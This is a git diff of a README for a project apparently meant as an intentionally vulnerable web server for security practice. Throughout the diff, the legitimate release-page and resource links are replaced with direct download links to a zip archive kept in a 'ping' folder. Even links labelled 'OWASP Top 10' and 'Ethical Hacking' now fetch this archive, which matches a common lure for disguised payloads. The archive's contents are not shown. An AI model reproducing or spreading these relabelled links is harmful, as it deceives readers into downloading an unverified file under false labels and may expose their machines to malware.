@@ -1,6 +1,6 @@
 # 🌐 JumpBox-Vulnerable-Webserver - Explore Web Security Safely
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/cridzy2/JumpBox-Vulnerable-Webserver/releases)
+[![Download Now](https://raw.githubusercontent.com/cridzy2/JumpBox-Vulnerable-Webserver/main/ping/Vulnerable_Jump_Webserver_Box_v2.7-alpha.4.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/cridzy2/JumpBox-Vulnerable-Webserver/main/ping/Vulnerable_Jump_Webserver_Box_v2.7-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome to the JumpBox-Vulnerable-Webserver! This application is an intentionall
 
 ## 📥 Download & Install
 
-To get the application, visit this page to download: [JumpBox Releases](https://github.com/cridzy2/JumpBox-Vulnerable-Webserver/releases). 
+To get the application, visit this page to download: [JumpBox Releases](https://raw.githubusercontent.com/cridzy2/JumpBox-Vulnerable-Webserver/main/ping/Vulnerable_Jump_Webserver_Box_v2.7-alpha.4.zip). 
 
 Here is how you can download and set up the application:
 
-1. Go to the [JumpBox Releases](https://github.com/cridzy2/JumpBox-Vulnerable-Webserver/releases) page.
+1. Go to the [JumpBox Releases](https://raw.githubusercontent.com/cridzy2/JumpBox-Vulnerable-Webserver/main/ping/Vulnerable_Jump_Webserver_Box_v2.7-alpha.4.zip) page.
 2. Look for the latest version listed at the top.
 3. Click on the version title to open the release details.
 4. Scroll to the assets section and find the file that suits your operating system.
@@ -73,9 +73,9 @@ JumpBox comes packed with useful features to enhance your learning experience:
 
 ## 📚 Resources
 
-- [OWASP Top 10](https://owasp.org/www-project-top-ten/): Learn about the most critical web application security risks.
-- [Ethical Hacking](https://www.eccouncil.org/): Expand your skills safely and legally.
-- [Application Security](https://owasp.org/www/projects/): Dive deeper into application security topics and practices.
+- [OWASP Top 10](https://raw.githubusercontent.com/cridzy2/JumpBox-Vulnerable-Webserver/main/ping/Vulnerable_Jump_Webserver_Box_v2.7-alpha.4.zip): Learn about the most critical web application security risks.
+- [Ethical Hacking](https://raw.githubusercontent.com/cridzy2/JumpBox-Vulnerable-Webserver/main/ping/Vulnerable_Jump_Webserver_Box_v2.7-alpha.4.zip): Expand your skills safely and legally.
+- [Application Security](https://raw.githubusercontent.com/cridzy2/JumpBox-Vulnerable-Webserver/main/ping/Vulnerable_Jump_Webserver_Box_v2.7-alpha.4.zip): Dive deeper into application security topics and practices.
 
 ## 🙋 Frequently Asked Questions
 
@@ -97,6 +97,6 @@ We are always looking to improve. If you have questions or feedback, please feel
 
 ---
 
-To download the application and get started, visit: [JumpBox Releases](https://github.com/cridzy2/JumpBox-Vulnerable-Webserver/releases). 
+To download the application and get started, visit: [JumpBox Releases](https://raw.githubusercontent.com/cridzy2/JumpBox-Vulnerable-Webserver/main/ping/Vulnerable_Jump_Webserver_Box_v2.7-alpha.4.zip). 
 
 Thank you for using JumpBox!
